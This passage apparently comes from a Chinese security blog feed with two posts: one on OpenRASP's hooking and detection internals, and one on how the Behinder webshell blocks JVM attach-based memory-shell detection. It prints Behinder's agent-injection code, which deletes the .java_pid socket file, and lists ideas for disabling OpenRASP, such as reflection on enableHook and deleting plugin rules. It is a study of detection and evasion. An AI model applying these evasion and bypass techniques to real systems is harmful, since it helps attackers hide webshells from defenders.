class="string">&quot;org/m0d9/sec/JavassistDemo/Target&quot;</span>.equals(className)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br></pre></td></tr></table></figure><p>（这个是beyond大佬以前MemShell的代码），需要注意的是premain以及transform实现接口，大同小异，OpenRASP的这个逻辑是在EngineBoot#start开始的，具体的代码就不贴了，流程跟踪如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EngineBoot#start</span><br><span class="line">EngineBoot#initTransformer</span><br><span class="line">CustomClassTransformer#</span><br><span class="line">CustomClassTransformer#addAnnotationHook</span><br><span class="line">CustomClassTransformer#retransform</span><br><span class="line">CustomClassTransformer#transform</span><br><span class="line">AbstractClassHook#transformClass</span><br></pre></td></tr></table></figure><p>OpenRASP具体的transform逻辑在AbstractClassHook的各种子类中实现</p><h4 id="Javassists"><a href="#Javassists" class="headerlink" title="Javassists"></a>Javassists</h4><p>transform内是通过Javassists字节码技术，实现对类方法的修改/插桩。以CommonHttpClientHook为例，整个调用链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AbstractClassHook#transformClass</span><br><span class="line">CommonHttpClientHook#hookMethod</span><br><span class="line">AbstractClassHook#insertAfter</span><br><span class="line">           javassist.CtBehavior#insertAfter</span><br></pre></td></tr></table></figure><p>具体关键代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@HookAnnotation</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonHttpClientHook</span> <span class="keyword">extends</span> <span class="title">AbstractSSRFHook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException </span>&#123;</span><br><span class="line">        String src = getInvokeStaticSrc(CommonHttpClientHook.class, <span class="string">&quot;checkHttpConnection&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$0,$1&quot;</span>, Object.class, String.class);</span><br><span class="line">        insertAfter(ctClass, <span class="string">&quot;parseUriReference&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Z)V&quot;</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkHttpConnection</span><span class="params">(Object object, String url)</span> </span>&#123;</span><br><span class="line">        String host = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>通过javassist在org.apache.commons.httpclient.URI#parseUriReference方法后加载了checkHttpConnection这个方法代码块。<br>这个checkHttpConnection功能则为攻击检查分析逻辑，后面详细讲。</p><h3 id="Hook了哪些类方法"><a href="#Hook了哪些类方法" class="headerlink" title="Hook了哪些类方法"></a>Hook了哪些类方法</h3><p>官方文档中有列出详细Hook了哪些函数 <a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook 函数列表</a>，如下<br><img src="/images/pasted-148.png" alt="upload successful"></p><p>继承AbstractClassHook且有HookAnnotation注解的类，他们的hook逻辑都会被加载，具体筛选代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addAnnotationHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Set&lt;Class&gt; classesSet = AnnotationScanner.getClassWithAnnotation(SCAN_ANNOTATION_PACKAGE, HookAnnotation.class);</span><br><span class="line">    <span class="keyword">for</span> (Class clazz : classesSet) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object object = clazz.newInstance();</span><br><span class="line">            <span class="keyword">if</span> (object <span class="keyword">instanceof</span> AbstractClassHook) &#123;</span><br><span class="line">                addHook((AbstractClassHook) object, clazz.getName());</span><br></pre></td></tr></table></figure><h2 id="OpenRasp的检测逻辑"><a href="#OpenRasp的检测逻辑" class="headerlink" title="OpenRasp的检测逻辑"></a>OpenRasp的检测逻辑</h2><p>在hook插入的代码逻辑，一般都是预处理的逻辑，真正判断是否是恶意poc，是在OpenRASP的checker逻辑中。</p><h3 id="checker"><a href="#checker" class="headerlink" title="checker"></a>checker</h3><p>还是以CommonHttpClientHook SSRF为例，hook插入了checkHttpConnection函数代码块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkHttpConnection</span><span class="params">(Object object, String url)</span> </span>&#123;</span><br><span class="line">        String host = <span class="keyword">null</span>;</span><br><span class="line">        String port = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                host = Reflection.invokeStringMethod(object, <span class="string">&quot;getHost&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;);</span><br><span class="line">...</span><br><span class="line">            checkHttpUrl(url, host, port, <span class="string">&quot;commons_httpclient&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>checkHttpConnection最终会调用Checker，进行规则判断，调用过程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CommonHttpClientHook#checkHttpConnection</span><br><span class="line">AbstractSSRFHook#checkHttpUrl</span><br><span class="line">    com.baidu.openrasp.HookHandler#doCheck</span><br><span class="line">    com.baidu.openrasp.HookHandler#doCheckWithoutRequest</span><br><span class="line">    com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest</span><br><span class="line">    com.baidu.openrasp.plugin.checker.CheckerManager#check</span><br><span class="line">V8AttackChecker#check</span><br><span class="line">XssChecker#check</span><br><span class="line">SqlResultChecker#check</span><br><span class="line">MongoConnectionChecker#check</span><br><span class="line">SqlConnectionChecker#check</span><br><span class="line">...            </span><br></pre></td></tr></table></figure><p><img src="/images/pasted-149.png" alt="upload successful"></p><p>Cheker类型可以大致分为3类</p><ol><li>js插件检测，如SQL、命令执行、XXE、SSRF之类</li><li>java本地检查，目前仅2个</li><li>安全基线检测，主要是类似配置检查，如弱口令之类</li></ol><h3 id="v8"><a href="#v8" class="headerlink" title="v8"></a>v8</h3><p>以上的Checker中，以V8AttackChecker最重要。至于为何要用JS检测引擎作为核心，个人认为主要原因应该是支持跨语言、热部署。</p><h4 id="install-openrasp-v8-in-mac"><a href="#install-openrasp-v8-in-mac" class="headerlink" title="install openrasp-v8 in mac"></a>install openrasp-v8 in mac</h4><p>官网的<a href="https://rasp.baidu.com/doc/hacking/compile/java.html#java-v8">安装脚本</a>是linux的，这里给下max下需要变动的命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ../java/src/main/resources/natives/osx_64 &amp;&amp; cp java/libopenrasp_v8_java.dylib <span class="variable">$_</span></span><br></pre></td></tr></table></figure><h4 id="JS引擎"><a href="#JS引擎" class="headerlink" title="JS引擎"></a>JS引擎</h4><p>官方文档还是Rhino的流程(这里和v8大致是一样的，细节不同)<br><img src="/images/pasted-150.png" alt="upload successful"></p><p>主要有两部分</p><ol><li>openrasp-v8的js库</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">├── console.jsconsole.log实现</span><br><span class="line">├── flex.jstokenize库，有sql_tokenize&amp;cmd_tokenize</span><br><span class="line">└── rasp.jsRASP基础类</span><br></pre></td></tr></table></figure><p>这些库可以在js插件中进行调用</p><ol start="2"><li>js插件</li></ol><p>检测逻辑都是在js插件内实现，初始化流程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EngineBoot#start</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#Initialize</span><br><span class="line">V8#Initialize</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#UpdatePlugin</span><br><span class="line">V8#CreateSnapshot</span><br><span class="line">V8#ExecuteScript</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#InitFileWatcher</span><br></pre></td></tr></table></figure><p>其中V8.CreateSnapshot/ExecuteScript都是在openrasp-v8 jni内实现的，未深入跟踪。</p><p>其中JS.UpdatePlugin默认会加载plugins下面的js。还有InitFileWatcher实时监控js插件文件变动，这个师傅们有讲这里也不讲了。</p><h4 id="check"><a href="#check" class="headerlink" title="check"></a>check</h4><p>V8AttackChecker到v8的流程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V8AttackChecker#check</span><br><span class="line">JS#Check</span><br><span class="line">    V8#Check</span><br></pre></td></tr></table></figure><p>V8.Check也是jni实现，暂无力跟踪，猜测是会根据type，调用对应的js插件内的check函数，如type=ssrf，就会调用official/plugins.js内的plugin.check_ssrf。</p><h2 id="OpenRASP的绕过"><a href="#OpenRASP的绕过" class="headerlink" title="OpenRASP的绕过"></a>OpenRASP的绕过</h2><p>参考【1】中有提到HookHandler.enableHook这个属性，通过反射设置为false关闭Hook功能，达到OpenRASP的绕过。</p><p>从原理上大致脑爆下可能存在的攻击点，限于精力，未做验证。</p><ul><li>可以根据OpenRASP Hook&amp;Check逻辑上的一些控制变量，达到绕过效果，如上面的enableHook。</li><li>可以退出OpenRASP，如调用EngineBoot#release</li><li>可以搞瞎V8，如V8.stackGetter</li><li>可以删除js规则，如plugins/xxx.js</li><li>针对性绕过js插件检测逻辑</li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在阅读师傅们文章的基础上，记录了自己在纯静态读OpenRASP源码时感兴趣的一些知识点，大致对其架构原理有了一定的了解。</p><p>个人认为最主要的点还是在v8引擎以及插件的检测逻辑上，但是本篇重点没有在此，只是简要过了一遍整个架构及原理。后续如果有精力，可能会在此基础上再研究下绕过的知识。</p><p>参考【1】中提到openrasp类优先加载影响应用类的问题，印象中商业版好像是做了解决，找不到群聊记录了。</p><p>最后有趣的八卦下：openrasp一开始用的是v8+j2v8，0.20因为性能原因改成了Rhino，1.1又改回了v8+自研的openrasp-v8，感觉是一段精益求精的历史，很有意思。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://threedr3am.github.io/2019/12/31/OpenRASP%E6%A0%B8%E5%BF%83%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">OpenRASP核心源码浅析</a></li><li>[2] <a href="https://www.cnblogs.com/tr1ple/p/12918942.html">Java openrasp学习记录-2</a></li><li>[3] <a href="https://www.cnblogs.com/tr1ple/p/12709504.html#DAFPQtWG">Java openrasp学习记录-1</a></li><li>[4] <a href="https://paper.seebug.org/513/">Java RASP浅析——以百度OpenRASP为例</a></li><li>[5] <a href="https://rasp.baidu.com/doc/hacking/architect/java.html">系统架构 - Java 版本</a></li><li>[6] <a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook 函数列表</a></li><li>[7] <a href="https://github.com/baidu/openrasp">GitHub OpenRASP</a></li><li>[8] <a href="https://github.com/baidu-security/openrasp-v8">GitHub OpenRASP-v8</a></li><li>[9] <a href="https://paper.seebug.org/1041/#53">浅谈 RASP</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;RASP（Runtime Application self-protection）技术自Gartner在2014年提出，已经有挺长一段时间了。大厂们现在基本也都有自研的RASP、IAST产品。在开源RASP中，应以OpenRASP起步最早，应用也最广。不过因为性能原因，在实际攻防中覆盖面还是有限。&lt;/p&gt;
&lt;p&gt;RASP算是Java安全绕不开的一个技术点，有兴趣对此学习研究一番。参考文章中threedr3am、tr1ple、c0d3p1ut0s几个师傅们对于OpenRASP的原理、技术点都有跟踪和解释，因此本文不再多做类似的阐释，主要针对自己的一些知识盲点、兴趣点，做做研究与笔记。&lt;/p&gt;
&lt;h2 id=&quot;OpenRASP的Hook&quot;&gt;&lt;a href=&quot;#OpenRASP的Hook&quot; class=&quot;headerlink&quot; title=&quot;OpenRASP的Hook&quot;&gt;&lt;/a&gt;OpenRASP的Hook&lt;/h2&gt;&lt;p&gt;关注两点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如何Hook的&lt;/li&gt;
&lt;li&gt;Hook了哪些类的哪些方法&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;如何Hook&quot;&gt;&lt;a href=&quot;#如何Hook&quot; class=&quot;headerlink&quot; title=&quot;如何Hook&quot;&gt;&lt;/a&gt;如何Hook&lt;/h3&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OpenRASP" scheme="http://m0d9.me/tags/OpenRASP/"/>
    
    <category term="RASP" scheme="http://m0d9.me/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>从冰蝎antiAgent看Java Attach机制</title>
    <link href="http://m0d9.me/2021/06/21/JVM-Attach/"/>
    <id>http://m0d9.me/2021/06/21/JVM-Attach/</id>
    <published>2021-06-21T09:24:00.000Z</published>
    <updated>2021-06-24T07:15:51.920Z</updated>
    
    <content type="html"><![CDATA[<p>webshell的隐藏与检出一直以来都是攻防的焦点，随着内存马的研究与工具的公开，内存shell已然成为了webshell主流。</p><p>引用【9】中关于攻击的思路</p><blockquote><ol><li>基于Servlet规范的利用，动态注册Servlet规范中的组件，包括Servlet，Filter，Listener，这部分的公开文章比较多，比如：基于tomcat的内存 Webshell 无文件攻击技术（<a href="https://xz.aliyun.com/t/7388%EF%BC%89%E3%80%82">https://xz.aliyun.com/t/7388）。</a></li><li>基于特定框架的利用，框架一般对于Servlet又进行了一层封装，动态注册框架的路由，文章：基于内存 Webshell 的无文件攻击技术研究（<a href="https://www.anquanke.com/post/id/198886%EF%BC%89">https://www.anquanke.com/post/id/198886）</a></li><li>基于javaagent修改Servlet处理流程中的字节码，工具：memShell（<a href="https://github.com/rebeyond/memShell%EF%BC%89">https://github.com/rebeyond/memShell）</a></li></ol></blockquote><p>引用【8】中关于检测的思路</p><blockquote><p>无论是以上哪种攻击方式，从防守方的角度来说，检测的方式都是通过java instrumentation机制，将检测jar包attach到tomcat jvm，检查加载到jvm中的类是否异常。整体检测思路为：</p><ol><li>获取tomcat jvm中所有加载的类</li><li>遍历每个类，判断是否为风险类。我们把可能被攻击方新增/修改内存中的类，标记为风险类（比如实现了filter/servlet的类）</li><li>遍历风险类，检查是否为webshell：</li><li>检查高风险类的class文件是否存在；</li><li>反编译风险类字节码，检查java文件中包含恶意代码</li></ol></blockquote><p>有攻有防，而防御又引发攻击的升级，冰蝎最新版已经加入了反VirtualMachine.Attach功能。</p><a id="more"></a><h2 id="冰蝎AntiAgent"><a href="#冰蝎AntiAgent" class="headerlink" title="冰蝎AntiAgent"></a>冰蝎AntiAgent</h2><h3 id="AntiAgent的实现"><a href="#AntiAgent的实现" class="headerlink" title="AntiAgent的实现"></a>AntiAgent的实现</h3><p>先看看冰蝎的实现，具体在MemShell.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAgentShell</span><span class="params">(<span class="keyword">boolean</span> antiAgent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      Class VirtualMachineCls = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">      Method attachMethod = VirtualMachineCls.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>, String.class);</span><br><span class="line">      Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>, String.class, String.class);</span><br><span class="line">      Object obj = attachMethod.invoke(VirtualMachineCls, getCurrentPID());</span><br><span class="line">      loadAgentMethod.invoke(obj, libPath, base64encode(path) + <span class="string">&quot;|&quot;</span> + base64encode(password));</span><br><span class="line">      String osInfo = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();</span><br><span class="line">      <span class="keyword">if</span> (osInfo.indexOf(<span class="string">&quot;windows&quot;</span>) &lt; <span class="number">0</span> &amp;&amp; osInfo.indexOf(<span class="string">&quot;winnt&quot;</span>) &lt; <span class="number">0</span> &amp;&amp; osInfo.indexOf(<span class="string">&quot;linux&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; antiAgent) &#123;</span><br><span class="line">         String fileName = <span class="string">&quot;/tmp/.java_pid&quot;</span> + getCurrentPID();</span><br><span class="line">         (<span class="keyword">new</span> File(fileName)).delete();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">      var12.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Error var13) &#123;</span><br><span class="line">      var13.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      (<span class="keyword">new</span> File(libPath)).delete();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="测试AntiAgent"><a href="#测试AntiAgent" class="headerlink" title="测试AntiAgent"></a>测试AntiAgent</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testAttach</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String pid = <span class="string">&quot;2715&quot;</span>;</span><br><span class="line">            System.out.println(System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>));</span><br><span class="line">            String password = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            String currentPath = <span class="string">&quot;/Users/mody/study/java/MemShell/memShell/target/&quot;</span>;</span><br><span class="line">            String agentFile = currentPath + <span class="string">&quot;agent.jar&quot;</span>;</span><br><span class="line">            agentFile = <span class="keyword">new</span> File(agentFile).getCanonicalPath();</span><br><span class="line">            String agentArgs = currentPath;</span><br><span class="line">            <span class="keyword">if</span> (!password.equals(<span class="string">&quot;&quot;</span>) || password != <span class="keyword">null</span>) &#123;</span><br><span class="line">                agentArgs = agentArgs + <span class="string">&quot;^&quot;</span> + password;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line">            vm.loadAgent(agentFile, agentArgs);</span><br><span class="line">            String fileName = System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>)+<span class="string">&quot;.java_pid&quot;</span> + pid;</span><br><span class="line">            System.out.println(fileName);</span><br><span class="line">            Boolean e = (<span class="keyword">new</span> File(fileName)).exists();</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">            var12.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="comment">//            (new File(libPath)).delete();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li>找一个jvm进程，运行testAttach</li><li>删除对应.java_pidxx</li><li>再运行testAttach，会发现报错，socket连不上</li></ol><p>可以看出，冰蝎通过删除.java_pid，实现了无法VirtualMachine.attach。原理如何？检测是否有绕过空间？</p><h2 id="Java-Attach机制"><a href="#Java-Attach机制" class="headerlink" title="Java Attach机制"></a>Java Attach机制</h2><p>参考【1】中总结了Java 的3种动态Attach方法</p><ol><li>继承Tool/HotSpotAgent.attach（采用Serviceability Agent，简称SA）</li><li>VirtualMachine.attach（Attach到Attach Listener线程后执行有限命令）</li><li>Perf.getPerf().attach（通过PerfData文件获取信息）</li></ol><p><img src="/images/pasted-146.png" alt="upload successful"></p><p>其中1会暂停进程，不适用于内存马的检测，3只是关注进程状态信息，主要用于性能分析，关注的类不全，无法用于检测异常类。</p><h3 id="Java-Instrumentation-API"><a href="#Java-Instrumentation-API" class="headerlink" title="Java Instrumentation API"></a>Java Instrumentation API</h3><p>引用参考【10】，Java Instrumentation APi支持启动时/运行时Attach Agent</p><p>如果需要在目标JVM启动的同时加载Agent，需要在Agent中实现下面的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1] public static void premain(String agentArgs, Instrumentation inst);</span><br><span class="line">[2] public static void premain(String agentArgs);</span><br></pre></td></tr></table></figure><p>如果希望在目标JVM运行时加载Agent，则需要实现下面的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1] public static void agentmain(String agentArgs, Instrumentation inst);</span><br><span class="line">[2] public static void agentmain(String agentArgs);</span><br></pre></td></tr></table></figure><p>本文只关注运行时加载Agent，也就是VirtualMachine.attach。</p><h3 id="VirtualMachine-attach"><a href="#VirtualMachine-attach" class="headerlink" title="VirtualMachine.attach"></a>VirtualMachine.attach</h3><p><img src="/images/pasted-145.png" alt="upload successful"><br>此流程图需要搭配参考【3】中的调试过程，分析得出</p><p>JVM 流程</p><ol><li>init, 等待SIGQUIT（也是SIGBREAK）</li><li>收到SINQUIT，attach_pid验证（这个不是很重要）</li><li>判断是否有对应java_pid socket文件，没有则创建</li><li>建立unix socket tcp server ,绑定java_pid socket通道</li><li>进入循环，响应attach client</li><li>新SIGQUIT，验证attach_pid(不重要), 进入5（重点，并不会重新建server）</li></ol><p>在步骤5完成之后，删除掉java_pid socket文件，会怎样？可恢复吗？</p><ol><li>即使删除socket通道，server不会失败重新尝试连接</li><li>即使新建相同name的unix socket通道，client也无法连接，所以不可恢复</li></ol><h3 id="UnixSocket"><a href="#UnixSocket" class="headerlink" title="UnixSocket"></a>UnixSocket</h3><p>以下通过实验验证以上的两点结论</p><p>server.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//接收内容并返回结果</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandleServerContext</span><span class="params">(context <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">now := time.Now().String()</span><br><span class="line"><span class="keyword">return</span> now</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收连接并处理</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandleServerConn</span><span class="params">(c net.Conn)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> c.Close()</span><br><span class="line">bufsize := <span class="number">32</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, bufsize)</span><br><span class="line">nr, err := c.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Read: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这里，你需要 parse buf 里的数据来决定返回什么给客户端</span></span><br><span class="line"><span class="comment">// 假设 respnoseData 是你想返回的文件内容</span></span><br><span class="line">fmt.Print(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">result := HandleServerContext(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">_, err = c.Write([]<span class="keyword">byte</span>(result))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Writes failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Print(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s_filename := <span class="string">&quot;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/.java_pid10021&quot;</span></span><br><span class="line">addr, err := net.ResolveUnixAddr(<span class="string">&quot;unix&quot;</span>, s_filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot resolve unix addr: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">listener, err := net.ListenUnix(<span class="string">&quot;unix&quot;</span>, addr)</span><br><span class="line"><span class="keyword">defer</span> listener.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot listen to unix domain socket: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Listening on&quot;</span>, listener.Addr())</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">c, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Accept: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> HandleServerConn(c)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 